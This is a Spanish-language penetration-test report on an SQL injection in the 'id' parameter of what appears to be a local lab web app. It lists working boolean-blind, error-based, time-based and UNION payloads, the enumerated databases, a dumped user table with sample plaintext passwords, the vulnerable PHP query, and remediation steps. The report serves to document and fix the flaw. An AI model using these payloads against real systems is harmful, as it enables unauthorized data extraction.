# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 15:41  
**Herramientas:** curl, sqlmap 1.10.2  

---

## Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de **SQL Injection** en el parámetro `id` del formulario de búsqueda de usuarios. La explotación permitió extraer la totalidad de los datos de la base de datos `sqli_demo`, incluyendo credenciales en texto plano.

---

## Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection (Error-based, Boolean-blind, Time-blind, UNION) |
| **Parámetro vulnerable** | `id` (método GET) |
| **URL afectada** | `http://web.dev.local:8083/?id=<payload>&Submit=Submit` |
| **CVSS estimado** | 9.8 (Crítico) |
| **Backend DBMS** | MySQL 5 (MariaDB fork) |
| **Tecnología web** | PHP 8.1.33, Apache 2.4.65, Linux Debian |

---

## Prueba de Concepto

### 1. Detección inicial

Al enviar una comilla simple como valor del parámetro `id`, el servidor devolvió un error SQL explícito:

```
GET /?id=1'&Submit=Submit

Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the right syntax
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

Esto confirmó que la entrada del usuario se inserta directamente en la consulta SQL sin sanitización ni uso de consultas preparadas.

### 2. Vectores de inyección identificados

**Boolean-based blind:**
```
id=1' OR NOT 9498=9498#
```

**Error-based:**
```
id=1' AND EXTRACTVALUE(4916,CONCAT(0x5c,0x7176786b71,(SELECT (ELT(4916=4916,1))),0x7162707171))-- XbML
```

**Time-based blind:**
```
id=1' AND (SELECT 9954 FROM (SELECT(SLEEP(5)))VhDO)-- ciFu
```

**UNION query (2 columnas):**
```
id=1' UNION ALL SELECT NULL,CONCAT(0x7176786b71,<data>,0x7162707171)#
```

### 3. Enumeración de bases de datos

```sql
-- Bases de datos encontradas:
information_schema
mysql
performance_schema
sqli_demo   <-- objetivo principal
sys
```

### 4. Exfiltración de datos - Tabla `sqli_demo.users`

| user_id | username  | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin     | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith    | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson  | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown    | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis    | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller   | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson   | Frank      | Wilson    | frank@example.com   | admin123    |

> ⚠️ **Las contraseñas se almacenan en texto plano**, lo que agrava considerablemente el impacto.

---

## Causa Raíz

El código fuente en `/var/www/html/low.php` construye la consulta SQL concatenando directamente el valor del parámetro sin sanitización:

```php
// Código vulnerable (inferido del error)
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

---

## Impacto

- **Confidencialidad:** Exfiltración completa de la tabla de usuarios, incluyendo credenciales en texto plano.
- **Integridad:** Posibilidad de modificar o eliminar datos de la base de datos.
- **Disponibilidad:** Posibilidad de ejecutar operaciones destructivas (DROP, TRUNCATE).
- **Escalada:** Las credenciales obtenidas podrían usarse para acceder a otros sistemas si se reutilizan contraseñas.

---

## Recomendaciones

1. **Usar consultas preparadas (Prepared Statements):**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar entradas:** Verificar que el parámetro `id` sea estrictamente numérico antes de procesarlo.

3. **Hashear contraseñas:** Usar `password_hash()` con bcrypt para almacenar contraseñas de forma segura.

4. **Deshabilitar mensajes de error en producción:** Los errores SQL detallados facilitan enormemente la explotación.

5. **Principio de mínimo privilegio:** El usuario de base de datos de la aplicación no debe tener permisos para acceder a `information_schema` ni otras bases de datos del sistema.

---

## Conclusión

La aplicación presenta una vulnerabilidad crítica de SQL Injection de tipo **in-band** (error-based y UNION-based) que permite la extracción completa de datos sensibles. La explotación fue trivial y no requirió autenticación previa. Se recomienda corrección inmediata.
